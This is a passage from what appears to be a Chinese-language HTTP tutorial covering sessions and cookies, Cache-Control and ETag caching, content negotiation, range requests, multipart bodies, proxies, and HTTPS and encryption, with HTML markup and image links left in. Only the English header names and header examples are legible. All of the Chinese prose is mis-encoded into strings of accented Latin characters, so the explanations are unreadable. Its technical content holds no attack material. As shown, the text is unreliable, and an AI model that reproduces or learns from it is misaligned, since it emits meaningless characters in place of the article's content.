å€¼å­˜å…¥æµè§ˆå™¨ä¸­ï¼›</li><li>å®¢æˆ·ç«¯ä¹‹åå¯¹åŒä¸€ä¸ªæœåŠ¡å™¨è¿›è¡Œè¯·æ±‚æ—¶ä¼šåŒ…å«è¯¥ Cookie å€¼ï¼ŒæœåŠ¡å™¨æ”¶åˆ°ä¹‹åæå–å‡º Session IDï¼Œä» Redis ä¸­å–å‡ºç”¨æˆ·ä¿¡æ¯ï¼Œç»§ç»­ä¹‹å‰çš„ä¸šåŠ¡æ“ä½œã€‚</li></ul><p>åº”è¯¥æ³¨æ„ Session ID çš„å®‰å…¨æ€§é—®é¢˜ï¼Œä¸èƒ½è®©å®ƒè¢«æ¶æ„æ”»å‡»è€…è½»æ˜“è·å–ï¼Œé‚£ä¹ˆå°±ä¸èƒ½äº§ç”Ÿä¸€ä¸ªå®¹æ˜“è¢«çŒœåˆ°çš„ Session ID å€¼ã€‚æ­¤å¤–ï¼Œè¿˜éœ€è¦ç»å¸¸é‡æ–°ç”Ÿæˆ Session IDã€‚åœ¨å¯¹å®‰å…¨æ€§è¦æ±‚æé«˜çš„åœºæ™¯ä¸‹ï¼Œä¾‹å¦‚è½¬è´¦ç­‰æ“ä½œï¼Œé™¤äº†ä½¿ç”¨ Session ç®¡ç†ç”¨æˆ·çŠ¶æ€ä¹‹å¤–ï¼Œè¿˜éœ€è¦å¯¹ç”¨æˆ·è¿›è¡Œé‡æ–°éªŒè¯ï¼Œæ¯”å¦‚é‡æ–°è¾“å…¥å¯†ç ï¼Œæˆ–è€…ä½¿ç”¨çŸ­ä¿¡éªŒè¯ç ç­‰æ–¹å¼ã€‚</p><h3>9. æµè§ˆå™¨ç¦ç”¨ Cookie</h3><p>æ­¤æ—¶æ— æ³•ä½¿ç”¨ Cookie æ¥ä¿å­˜ç”¨æˆ·ä¿¡æ¯ï¼Œåªèƒ½ä½¿ç”¨ Sessionã€‚é™¤æ­¤ä¹‹å¤–ï¼Œä¸èƒ½å†å°† Session ID å­˜æ”¾åˆ° Cookie ä¸­ï¼Œè€Œæ˜¯ä½¿ç”¨ URL é‡å†™æŠ€æœ¯ï¼Œå°† Session ID ä½œä¸º URL çš„å‚æ•°è¿›è¡Œä¼ é€’ã€‚</p><h3>10. Cookie ä¸ Session é€‰æ‹©</h3><ul><li>Cookie åªèƒ½å­˜å‚¨ ASCII ç å­—ç¬¦ä¸²ï¼Œè€Œ Session åˆ™å¯ä»¥å­˜å‚¨ä»»ä½•ç±»å‹çš„æ•°æ®ï¼Œå› æ­¤åœ¨è€ƒè™‘æ•°æ®å¤æ‚æ€§æ—¶é¦–é€‰ Sessionï¼›</li><li>Cookie å­˜å‚¨åœ¨æµè§ˆå™¨ä¸­ï¼Œå®¹æ˜“è¢«æ¶æ„æŸ¥çœ‹ã€‚å¦‚æœéè¦å°†ä¸€äº›éšç§æ•°æ®å­˜åœ¨ Cookie ä¸­ï¼Œå¯ä»¥å°† Cookie å€¼è¿›è¡ŒåŠ å¯†ï¼Œç„¶ååœ¨æœåŠ¡å™¨è¿›è¡Œè§£å¯†ï¼›</li><li>å¯¹äºå¤§å‹ç½‘ç«™ï¼Œå¦‚æœç”¨æˆ·æ‰€æœ‰çš„ä¿¡æ¯éƒ½å­˜å‚¨åœ¨ Session ä¸­ï¼Œé‚£ä¹ˆå¼€é”€æ˜¯éå¸¸å¤§çš„ï¼Œå› æ­¤ä¸å»ºè®®å°†æ‰€æœ‰çš„ç”¨æˆ·ä¿¡æ¯éƒ½å­˜å‚¨åˆ° Session ä¸­ã€‚</li></ul><h2>ç¼“å­˜</h2><h3>1. ä¼˜ç‚¹</h3><ul><li>ç¼“è§£æœåŠ¡å™¨å‹åŠ›ï¼›</li><li>é™ä½å®¢æˆ·ç«¯è·å–èµ„æºçš„å»¶è¿Ÿï¼šç¼“å­˜é€šå¸¸ä½äºå†…å­˜ä¸­ï¼Œè¯»å–ç¼“å­˜çš„é€Ÿåº¦æ›´å¿«ã€‚å¹¶ä¸”ç¼“å­˜æœåŠ¡å™¨åœ¨åœ°ç†ä½ç½®ä¸Šä¹Ÿæœ‰å¯èƒ½æ¯”æºæœåŠ¡å™¨æ¥å¾—è¿‘ï¼Œä¾‹å¦‚æµè§ˆå™¨ç¼“å­˜ã€‚</li></ul><h3>2. å®ç°æ–¹æ³•</h3><ul><li>è®©ä»£ç†æœåŠ¡å™¨è¿›è¡Œç¼“å­˜ï¼›</li><li>è®©å®¢æˆ·ç«¯æµè§ˆå™¨è¿›è¡Œç¼“å­˜ã€‚</li></ul><h3>3. Cache-Control</h3><p>HTTP/1.1 é€šè¿‡ Cache-Control é¦–éƒ¨å­—æ®µæ¥æ§åˆ¶ç¼“å­˜ã€‚</p><p><b>3.1 ç¦æ­¢è¿›è¡Œç¼“å­˜</b> </p><p>no-store æŒ‡ä»¤è§„å®šä¸èƒ½å¯¹è¯·æ±‚æˆ–å“åº”çš„ä»»ä½•ä¸€éƒ¨åˆ†è¿›è¡Œç¼“å­˜ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">Cache-Control: no-store</code></pre></div><p><b>3.2 å¼ºåˆ¶ç¡®è®¤ç¼“å­˜</b> </p><p>no-cache æŒ‡ä»¤è§„å®šç¼“å­˜æœåŠ¡å™¨éœ€è¦å…ˆå‘æºæœåŠ¡å™¨éªŒè¯ç¼“å­˜èµ„æºçš„æœ‰æ•ˆæ€§ï¼Œåªæœ‰å½“ç¼“å­˜èµ„æºæœ‰æ•ˆæ—¶æ‰èƒ½ä½¿ç”¨è¯¥ç¼“å­˜å¯¹å®¢æˆ·ç«¯çš„è¯·æ±‚è¿›è¡Œå“åº”ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">Cache-Control: no-cache</code></pre></div><p><b>3.3 ç§æœ‰ç¼“å­˜å’Œå…¬å…±ç¼“å­˜</b> </p><p>private æŒ‡ä»¤è§„å®šäº†å°†èµ„æºä½œä¸ºç§æœ‰ç¼“å­˜ï¼Œåªèƒ½è¢«å•ç‹¬ç”¨æˆ·ä½¿ç”¨ï¼Œä¸€èˆ¬å­˜å‚¨åœ¨ç”¨æˆ·æµè§ˆå™¨ä¸­ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">Cache-Control: private</code></pre></div><p>public æŒ‡ä»¤è§„å®šäº†å°†èµ„æºä½œä¸ºå…¬å…±ç¼“å­˜ï¼Œå¯ä»¥è¢«å¤šä¸ªç”¨æˆ·ä½¿ç”¨ï¼Œä¸€èˆ¬å­˜å‚¨åœ¨ä»£ç†æœåŠ¡å™¨ä¸­ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">Cache-Control: public</code></pre></div><p><b>3.4 ç¼“å­˜è¿‡æœŸæœºåˆ¶</b> </p><p>max-age æŒ‡ä»¤å‡ºç°åœ¨è¯·æ±‚æŠ¥æ–‡ï¼Œå¹¶ä¸”ç¼“å­˜èµ„æºçš„ç¼“å­˜æ—¶é—´å°äºè¯¥æŒ‡ä»¤æŒ‡å®šçš„æ—¶é—´ï¼Œé‚£ä¹ˆå°±èƒ½æ¥å—è¯¥ç¼“å­˜ã€‚</p><p>max-age æŒ‡ä»¤å‡ºç°åœ¨å“åº”æŠ¥æ–‡ï¼Œè¡¨ç¤ºç¼“å­˜èµ„æºåœ¨ç¼“å­˜æœåŠ¡å™¨ä¸­ä¿å­˜çš„æ—¶é—´ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">Cache-Control: max-age=31536000</code></pre></div><p>Expires é¦–éƒ¨å­—æ®µä¹Ÿå¯ä»¥ç”¨äºå‘ŠçŸ¥ç¼“å­˜æœåŠ¡å™¨è¯¥èµ„æºä»€ä¹ˆæ—¶å€™ä¼šè¿‡æœŸã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">Expires: Wed, 04 Jul 2012 08:26:05 GMT</code></pre></div><ul><li>åœ¨ HTTP/1.1 ä¸­ï¼Œä¼šä¼˜å…ˆå¤„ç† max-age æŒ‡ä»¤ï¼›</li><li>åœ¨ HTTP/1.0 ä¸­ï¼Œmax-age æŒ‡ä»¤ä¼šè¢«å¿½ç•¥æ‰ã€‚</li></ul><h3>4. ç¼“å­˜éªŒè¯</h3><p>éœ€è¦å…ˆäº†è§£ ETag é¦–éƒ¨å­—æ®µçš„å«ä¹‰ï¼Œå®ƒæ˜¯èµ„æºçš„å”¯ä¸€æ ‡è¯†ã€‚URL ä¸èƒ½å”¯ä¸€è¡¨ç¤ºèµ„æºï¼Œä¾‹å¦‚ <code>http://www.google.com/</code> æœ‰ä¸­æ–‡å’Œè‹±æ–‡ä¸¤ä¸ªèµ„æºï¼Œåªæœ‰ ETag æ‰èƒ½å¯¹è¿™ä¸¤ä¸ªèµ„æºè¿›è¡Œå”¯ä¸€æ ‡è¯†ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">ETag: &#34;82e22293907ce725faf67773957acd12&#34;</code></pre></div><p>å¯ä»¥å°†ç¼“å­˜èµ„æºçš„ ETag å€¼æ”¾å…¥ If-None-Match é¦–éƒ¨ï¼ŒæœåŠ¡å™¨æ”¶åˆ°è¯¥è¯·æ±‚åï¼Œåˆ¤æ–­ç¼“å­˜èµ„æºçš„ ETag å€¼å’Œèµ„æºçš„æœ€æ–° ETag å€¼æ˜¯å¦ä¸€è‡´ï¼Œå¦‚æœä¸€è‡´åˆ™è¡¨ç¤ºç¼“å­˜èµ„æºæœ‰æ•ˆï¼Œè¿”å› 304 Not Modifiedã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">If-None-Match: &#34;82e22293907ce725faf67773957acd12&#34;</code></pre></div><p>Last-Modified é¦–éƒ¨å­—æ®µä¹Ÿå¯ä»¥ç”¨äºç¼“å­˜éªŒè¯ï¼Œå®ƒåŒ…å«åœ¨æºæœåŠ¡å™¨å‘é€çš„å“åº”æŠ¥æ–‡ä¸­ï¼ŒæŒ‡ç¤ºæºæœåŠ¡å™¨å¯¹èµ„æºçš„æœ€åä¿®æ”¹æ—¶é—´ã€‚ä½†æ˜¯å®ƒæ˜¯ä¸€ç§å¼±æ ¡éªŒå™¨ï¼Œå› ä¸ºåªèƒ½ç²¾ç¡®åˆ°ä¸€ç§’ï¼Œæ‰€ä»¥å®ƒé€šå¸¸ä½œä¸º ETag çš„å¤‡ç”¨æ–¹æ¡ˆã€‚å¦‚æœå“åº”é¦–éƒ¨å­—æ®µé‡Œå«æœ‰è¿™ä¸ªä¿¡æ¯ï¼Œå®¢æˆ·ç«¯å¯ä»¥åœ¨åç»­çš„è¯·æ±‚ä¸­å¸¦ä¸Š If-Modified-Since æ¥éªŒè¯ç¼“å­˜ã€‚æœåŠ¡å™¨åªåœ¨æ‰€è¯·æ±‚çš„èµ„æºåœ¨ç»™å®šçš„æ—¥æœŸæ—¶é—´ä¹‹åå¯¹å†…å®¹è¿›è¡Œè¿‡ä¿®æ”¹çš„æƒ…å†µä¸‹æ‰ä¼šå°†èµ„æºè¿”å›ï¼ŒçŠ¶æ€ç ä¸º 200 OKã€‚å¦‚æœè¯·æ±‚çš„èµ„æºä»é‚£æ—¶èµ·æœªç»ä¿®æ”¹ï¼Œé‚£ä¹ˆè¿”å›ä¸€ä¸ªä¸å¸¦æœ‰å®ä½“ä¸»ä½“çš„ 304 Not Modified å“åº”æŠ¥æ–‡ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">Last-Modified: Wed, 21 Oct 2015 07:28:00 GMT\nIf-Modified-Since: Wed, 21 Oct 2015 07:28:00 GMT</code></pre></div><h2>å†…å®¹åå•†</h2><p>é€šè¿‡å†…å®¹åå•†è¿”å›æœ€åˆé€‚çš„å†…å®¹ï¼Œä¾‹å¦‚æ ¹æ®æµè§ˆå™¨çš„é»˜è®¤è¯­è¨€é€‰æ‹©è¿”å›ä¸­æ–‡ç•Œé¢è¿˜æ˜¯è‹±æ–‡ç•Œé¢ã€‚</p><h3>1. ç±»å‹</h3><p><b>1.1 æœåŠ¡ç«¯é©±åŠ¨å‹</b> </p><p>å®¢æˆ·ç«¯è®¾ç½®ç‰¹å®šçš„ HTTP é¦–éƒ¨å­—æ®µï¼Œä¾‹å¦‚ Acceptã€Accept-Charsetã€Accept-Encodingã€Accept-Languageï¼ŒæœåŠ¡å™¨æ ¹æ®è¿™äº›å­—æ®µè¿”å›ç‰¹å®šçš„èµ„æºã€‚</p><p>å®ƒå­˜åœ¨ä»¥ä¸‹é—®é¢˜ï¼š</p><ul><li>æœåŠ¡å™¨å¾ˆéš¾çŸ¥é“å®¢æˆ·ç«¯æµè§ˆå™¨çš„å…¨éƒ¨ä¿¡æ¯ï¼›</li><li>å®¢æˆ·ç«¯æä¾›çš„ä¿¡æ¯ç›¸å½“å†—é•¿ï¼ˆHTTP/2 åè®®çš„é¦–éƒ¨å‹ç¼©æœºåˆ¶ç¼“è§£äº†è¿™ä¸ªé—®é¢˜ï¼‰ï¼Œå¹¶ä¸”å­˜åœ¨éšç§é£é™©ï¼ˆHTTP æŒ‡çº¹è¯†åˆ«æŠ€æœ¯ï¼‰ï¼›</li><li>ç»™å®šçš„èµ„æºéœ€è¦è¿”å›ä¸åŒçš„å±•ç°å½¢å¼ï¼Œå…±äº«ç¼“å­˜çš„æ•ˆç‡ä¼šé™ä½ï¼Œè€ŒæœåŠ¡å™¨ç«¯çš„å®ç°ä¼šè¶Šæ¥è¶Šå¤æ‚ã€‚</li></ul><p><b>1.2 ä»£ç†é©±åŠ¨å‹</b> </p><p>æœåŠ¡å™¨è¿”å› 300 Multiple Choices æˆ–è€… 406 Not Acceptableï¼Œå®¢æˆ·ç«¯ä»ä¸­é€‰å‡ºæœ€åˆé€‚çš„é‚£ä¸ªèµ„æºã€‚</p><h3>2. Vary</h3><div class=\"highlight\"><pre><code class=\"language-html\">Vary: Accept-Language</code></pre></div><p>åœ¨ä½¿ç”¨å†…å®¹åå•†çš„æƒ…å†µä¸‹ï¼Œåªæœ‰å½“ç¼“å­˜æœåŠ¡å™¨ä¸­çš„ç¼“å­˜æ»¡è¶³å†…å®¹åå•†æ¡ä»¶æ—¶ï¼Œæ‰èƒ½ä½¿ç”¨è¯¥ç¼“å­˜ï¼Œå¦åˆ™åº”è¯¥å‘æºæœåŠ¡å™¨è¯·æ±‚è¯¥èµ„æºã€‚</p><p>ä¾‹å¦‚ï¼Œä¸€ä¸ªå®¢æˆ·ç«¯å‘é€äº†ä¸€ä¸ªåŒ…å« Accept-Language é¦–éƒ¨å­—æ®µçš„è¯·æ±‚ä¹‹åï¼ŒæºæœåŠ¡å™¨è¿”å›çš„å“åº”åŒ…å« <code>Vary: Accept-Language</code> å†…å®¹ï¼Œç¼“å­˜æœåŠ¡å™¨å¯¹è¿™ä¸ªå“åº”è¿›è¡Œç¼“å­˜ä¹‹åï¼Œåœ¨å®¢æˆ·ç«¯ä¸‹ä¸€æ¬¡è®¿é—®åŒä¸€ä¸ª URL èµ„æºï¼Œå¹¶ä¸” Accept-Language ä¸ç¼“å­˜ä¸­çš„å¯¹åº”çš„å€¼ç›¸åŒæ—¶æ‰ä¼šè¿”å›è¯¥ç¼“å­˜ã€‚</p><h2>å†…å®¹ç¼–ç </h2><p>å†…å®¹ç¼–ç å°†å®ä½“ä¸»ä½“è¿›è¡Œå‹ç¼©ï¼Œä»è€Œå‡å°‘ä¼ è¾“çš„æ•°æ®é‡ã€‚</p><p>å¸¸ç”¨çš„å†…å®¹ç¼–ç æœ‰ï¼šgzipã€compressã€deflateã€identityã€‚</p><p>æµè§ˆå™¨å‘é€ Accept-Encoding é¦–éƒ¨ï¼Œå…¶ä¸­åŒ…å«æœ‰å®ƒæ‰€æ”¯æŒçš„å‹ç¼©ç®—æ³•ï¼Œä»¥åŠå„è‡ªçš„ä¼˜å…ˆçº§ã€‚æœåŠ¡å™¨åˆ™ä»ä¸­é€‰æ‹©ä¸€ç§ï¼Œä½¿ç”¨è¯¥ç®—æ³•å¯¹å“åº”çš„æ¶ˆæ¯ä¸»ä½“è¿›è¡Œå‹ç¼©ï¼Œå¹¶ä¸”å‘é€ Content-Encoding é¦–éƒ¨æ¥å‘ŠçŸ¥æµè§ˆå™¨å®ƒé€‰æ‹©äº†å“ªä¸€ç§ç®—æ³•ã€‚ç”±äºè¯¥å†…å®¹åå•†è¿‡ç¨‹æ˜¯åŸºäºç¼–ç ç±»å‹æ¥é€‰æ‹©èµ„æºçš„å±•ç°å½¢å¼çš„ï¼Œå“åº”æŠ¥æ–‡çš„ Vary é¦–éƒ¨å­—æ®µè‡³å°‘è¦åŒ…å« Content-Encodingã€‚</p><h2>èŒƒå›´è¯·æ±‚</h2><p>å¦‚æœç½‘ç»œå‡ºç°ä¸­æ–­ï¼ŒæœåŠ¡å™¨åªå‘é€äº†ä¸€éƒ¨åˆ†æ•°æ®ï¼ŒèŒƒå›´è¯·æ±‚å¯ä»¥ä½¿å¾—å®¢æˆ·ç«¯åªè¯·æ±‚æœåŠ¡å™¨æœªå‘é€çš„é‚£éƒ¨åˆ†æ•°æ®ï¼Œä»è€Œé¿å…æœåŠ¡å™¨é‡æ–°å‘é€æ‰€æœ‰æ•°æ®ã€‚</p><h3>1. Range</h3><p>åœ¨è¯·æ±‚æŠ¥æ–‡ä¸­æ·»åŠ  Range é¦–éƒ¨å­—æ®µæŒ‡å®šè¯·æ±‚çš„èŒƒå›´ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">GET /z4d4kWk.jpg HTTP/1.1\nHost: i.imgur.com\nRange: bytes=0-1023</code></pre></div><p>è¯·æ±‚æˆåŠŸçš„è¯æœåŠ¡å™¨è¿”å›çš„å“åº”åŒ…å« 206 Partial Content çŠ¶æ€ç ã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">HTTP/1.1 206 Partial Content\nContent-Range: bytes 0-1023/146515\nContent-Length: 1024\n...\n(binary content)</code></pre></div><h3>2. Accept-Ranges</h3><p>å“åº”é¦–éƒ¨å­—æ®µ Accept-Ranges ç”¨äºå‘ŠçŸ¥å®¢æˆ·ç«¯æ˜¯å¦èƒ½å¤„ç†èŒƒå›´è¯·æ±‚ï¼Œå¯ä»¥å¤„ç†ä½¿ç”¨ bytesï¼Œå¦åˆ™ä½¿ç”¨ noneã€‚</p><div class=\"highlight\"><pre><code class=\"language-html\">Accept-Ranges: bytes</code></pre></div><h3>3. å“åº”çŠ¶æ€ç </h3><ul><li>åœ¨è¯·æ±‚æˆåŠŸçš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¼šè¿”å› 206 Partial Content çŠ¶æ€ç ã€‚</li><li>åœ¨è¯·æ±‚çš„èŒƒå›´è¶Šç•Œçš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¼šè¿”å› 416 Requested Range Not Satisfiable çŠ¶æ€ç ã€‚</li><li>åœ¨ä¸æ”¯æŒèŒƒå›´è¯·æ±‚çš„æƒ…å†µä¸‹ï¼ŒæœåŠ¡å™¨ä¼šè¿”å› 200 OK çŠ¶æ€ç ã€‚</li></ul><h2>åˆ†å—ä¼ è¾“ç¼–ç </h2><p>Chunked Transfer Encodingï¼Œå¯ä»¥æŠŠæ•°æ®åˆ†å‰²æˆå¤šå—ï¼Œè®©æµè§ˆå™¨é€æ­¥æ˜¾ç¤ºé¡µé¢ã€‚</p><h2>å¤šéƒ¨åˆ†å¯¹è±¡é›†åˆ</h2><p>ä¸€ä»½æŠ¥æ–‡ä¸»ä½“å†…å¯å«æœ‰å¤šç§ç±»å‹çš„å®ä½“åŒæ—¶å‘é€ï¼Œæ¯ä¸ªéƒ¨åˆ†ä¹‹é—´ç”¨ boundary å­—æ®µå®šä¹‰çš„åˆ†éš”ç¬¦è¿›è¡Œåˆ†éš”ï¼Œæ¯ä¸ªéƒ¨åˆ†éƒ½å¯ä»¥æœ‰é¦–éƒ¨å­—æ®µã€‚</p><p>ä¾‹å¦‚ï¼Œä¸Šä¼ å¤šä¸ªè¡¨å•æ—¶å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹å¼ï¼š</p><div class=\"highlight\"><pre><code class=\"language-html\">Content-Type: multipart/form-data; boundary=AaB03x\n\n--AaB03x\nContent-Disposition: form-data; name=&#34;submit-name&#34;\n\nLarry\n--AaB03x\nContent-Disposition: form-data; name=&#34;files&#34;; filename=&#34;file1.txt&#34;\nContent-Type: text/plain\n\n... contents of file1.txt ...\n--AaB03x--</code></pre></div><h2>è™šæ‹Ÿä¸»æœº</h2><p>HTTP/1.1 ä½¿ç”¨è™šæ‹Ÿä¸»æœºæŠ€æœ¯ï¼Œä½¿å¾—ä¸€å°æœåŠ¡å™¨æ‹¥æœ‰å¤šä¸ªåŸŸåï¼Œå¹¶ä¸”åœ¨é€»è¾‘ä¸Šå¯ä»¥çœ‹æˆå¤šä¸ªæœåŠ¡å™¨ã€‚</p><h2>é€šä¿¡æ•°æ®è½¬å‘</h2><h3>1. ä»£ç†</h3><p>ä»£ç†æœåŠ¡å™¨æ¥å—å®¢æˆ·ç«¯çš„è¯·æ±‚ï¼Œå¹¶ä¸”è½¬å‘ç»™å…¶å®ƒæœåŠ¡å™¨ã€‚</p><p>ä½¿ç”¨ä»£ç†çš„ä¸»è¦ç›®çš„æ˜¯ï¼š</p><ul><li>ç¼“å­˜</li><li>è´Ÿè½½å‡è¡¡</li><li>ç½‘ç»œè®¿é—®æ§åˆ¶</li><li>è®¿é—®æ—¥å¿—è®°å½•</li></ul><p>ä»£ç†æœåŠ¡å™¨åˆ†ä¸ºæ­£å‘ä»£ç†å’Œåå‘ä»£ç†ä¸¤ç§ï¼š</p><ul><li>ç”¨æˆ·å¯Ÿè§‰å¾—åˆ°æ­£å‘ä»£ç†çš„å­˜åœ¨ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-d4d4ebeef1c6f6c73415fff7d5405659_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"527\" data-rawheight=\"170\" class=\"origin_image zh-lightbox-thumb\" width=\"527\" data-original=\"https://pic2.zhimg.com/v2-d4d4ebeef1c6f6c73415fff7d5405659_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;527&#39; height=&#39;170&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"527\" data-rawheight=\"170\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"527\" data-original=\"https://pic2.zhimg.com/v2-d4d4ebeef1c6f6c73415fff7d5405659_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-d4d4ebeef1c6f6c73415fff7d5405659_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><ul><li>è€Œåå‘ä»£ç†ä¸€èˆ¬ä½äºå†…éƒ¨ç½‘ç»œä¸­ï¼Œç”¨æˆ·å¯Ÿè§‰ä¸åˆ°ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic1.zhimg.com/v2-90662d6d8c4f9ae2360d66cf96cccbfc_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"467\" data-rawheight=\"175\" class=\"origin_image zh-lightbox-thumb\" width=\"467\" data-original=\"https://pic1.zhimg.com/v2-90662d6d8c4f9ae2360d66cf96cccbfc_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;467&#39; height=&#39;175&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"467\" data-rawheight=\"175\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"467\" data-original=\"https://pic1.zhimg.com/v2-90662d6d8c4f9ae2360d66cf96cccbfc_r.jpg\" data-actualsrc=\"https://pic1.zhimg.com/v2-90662d6d8c4f9ae2360d66cf96cccbfc_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>2. ç½‘å…³</h3><p>ä¸ä»£ç†æœåŠ¡å™¨ä¸åŒçš„æ˜¯ï¼Œç½‘å…³æœåŠ¡å™¨ä¼šå°† HTTP è½¬åŒ–ä¸ºå…¶å®ƒåè®®è¿›è¡Œé€šä¿¡ï¼Œä»è€Œè¯·æ±‚å…¶å®ƒé HTTP æœåŠ¡å™¨çš„æœåŠ¡ã€‚</p><h3>3. éš§é“</h3><p>ä½¿ç”¨ SSL ç­‰åŠ å¯†æ‰‹æ®µï¼Œåœ¨å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¹‹é—´å»ºç«‹ä¸€æ¡å®‰å…¨çš„é€šä¿¡çº¿è·¯ã€‚</p><h2>å…­ã€HTTPS</h2><p>HTTP æœ‰ä»¥ä¸‹å®‰å…¨æ€§é—®é¢˜ï¼š</p><ul><li>ä½¿ç”¨æ˜æ–‡è¿›è¡Œé€šä¿¡ï¼Œå†…å®¹å¯èƒ½ä¼šè¢«çªƒå¬ï¼›</li><li>ä¸éªŒè¯é€šä¿¡æ–¹çš„èº«ä»½ï¼Œé€šä¿¡æ–¹çš„èº«ä»½æœ‰å¯èƒ½é­é‡ä¼ªè£…ï¼›</li><li>æ— æ³•è¯æ˜æŠ¥æ–‡çš„å®Œæ•´æ€§ï¼ŒæŠ¥æ–‡æœ‰å¯èƒ½é­ç¯¡æ”¹ã€‚</li></ul><p>HTTPS å¹¶ä¸æ˜¯æ–°åè®®ï¼Œè€Œæ˜¯è®© HTTP å…ˆå’Œ SSLï¼ˆSecure Sockets Layerï¼‰é€šä¿¡ï¼Œå†ç”± SSL å’Œ TCP é€šä¿¡ï¼Œä¹Ÿå°±æ˜¯è¯´ HTTPS ä½¿ç”¨äº†éš§é“è¿›è¡Œé€šä¿¡ã€‚</p><p>é€šè¿‡ä½¿ç”¨ SSLï¼ŒHTTPS å…·æœ‰äº†åŠ å¯†ï¼ˆé˜²çªƒå¬ï¼‰ã€è®¤è¯ï¼ˆé˜²ä¼ªè£…ï¼‰å’Œå®Œæ•´æ€§ä¿æŠ¤ï¼ˆé˜²ç¯¡æ”¹ï¼‰ã€‚</p><figure data-size=\"normal\"><noscript><img src=\"https://pic2.zhimg.com/v2-cb7f3d4ba96c5ce37f339bbfe42db675_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1103\" data-rawheight=\"345\" class=\"origin_image zh-lightbox-thumb\" width=\"1103\" data-original=\"https://pic2.zhimg.com/v2-cb7f3d4ba96c5ce37f339bbfe42db675_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;1103&#39; height=&#39;345&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1103\" data-rawheight=\"345\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"1103\" data-original=\"https://pic2.zhimg.com/v2-cb7f3d4ba96c5ce37f339bbfe42db675_r.jpg\" data-actualsrc=\"https://pic2.zhimg.com/v2-cb7f3d4ba96c5ce37f339bbfe42db675_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h2>åŠ å¯†</h2><h3>1. å¯¹ç§°å¯†é’¥åŠ å¯†</h3><p>å¯¹ç§°å¯†é’¥åŠ å¯†ï¼ˆSymmetric-Key Encryptionï¼‰ï¼ŒåŠ å¯†å’Œè§£å¯†ä½¿ç”¨åŒä¸€å¯†é’¥ã€‚</p><ul><li>ä¼˜ç‚¹ï¼šè¿ç®—é€Ÿåº¦å¿«ï¼›</li><li>ç¼ºç‚¹ï¼šæ— æ³•å®‰å…¨åœ°å°†å¯†é’¥ä¼ è¾“ç»™é€šä¿¡æ–¹ã€‚</li></ul><figure data-size=\"normal\"><noscript><img src=\"https://pic4.zhimg.com/v2-c29f1767fb947606162362a3cf36241b_b.jpg\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"772\" data-rawheight=\"369\" class=\"origin_image zh-lightbox-thumb\" width=\"772\" data-original=\"https://pic4.zhimg.com/v2-c29f1767fb947606162362a3cf36241b_r.jpg\"/></noscript><img src=\"data:image/svg+xml;utf8,&lt;svg xmlns=&#39;http://www.w3.org/2000/svg&#39; width=&#39;772&#39; height=&#39;369&#39;&gt;&lt;/svg&gt;\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"772\" data-rawheight=\"369\" class=\"origin_image zh-lightbox-thumb lazy\" width=\"772\" data-original=\"https://pic4.zhimg.com/v2-c29f1767fb947606162362a3cf36241b_r.jpg\" data-actualsrc=\"https://pic4.zhimg.com/v2-c29f1767fb947606162362a3cf36241b_b.jpg\"/></figure><p class=\"ztext-empty-paragraph\"><br/></p><h3>2.éå¯¹ç§°å¯†é’¥åŠ å¯†</h3><p>éå¯¹ç§°å¯†é’¥åŠ å¯†ï¼Œåˆç§°å…¬å¼€å¯†é’¥åŠ å¯†ï¼ˆPublic-Key Encryptionï¼‰ï¼ŒåŠ å¯†å’Œè§£å¯†ä½¿ç”¨ä¸åŒçš„å¯†é’¥ã€‚</p><p>å…¬å¼€å¯†é’¥æ‰€æœ‰äººéƒ½å¯ä»¥è·å¾—ï¼Œé€šä¿¡å‘é€æ–¹è·å¾—æ¥æ”¶æ–¹çš„å…¬å¼€å¯†é’¥ä¹‹åï¼Œå°±å¯ä»¥ä½¿ç”¨å…¬å¼€å¯†é’¥è¿›è¡ŒåŠ å¯†ï¼Œæ¥æ”¶æ–¹æ”¶åˆ°é€šä¿¡å†…å®¹åä½¿ç”¨ç§æœ‰å¯†é’¥è§£å¯†ã€‚</p><p>éå¯¹ç§°å¯†é’¥é™¤äº†ç”¨æ¥åŠ å¯†ï¼Œè¿˜å¯ä»¥ç”¨æ¥è¿›è¡Œç­¾åã€‚å› 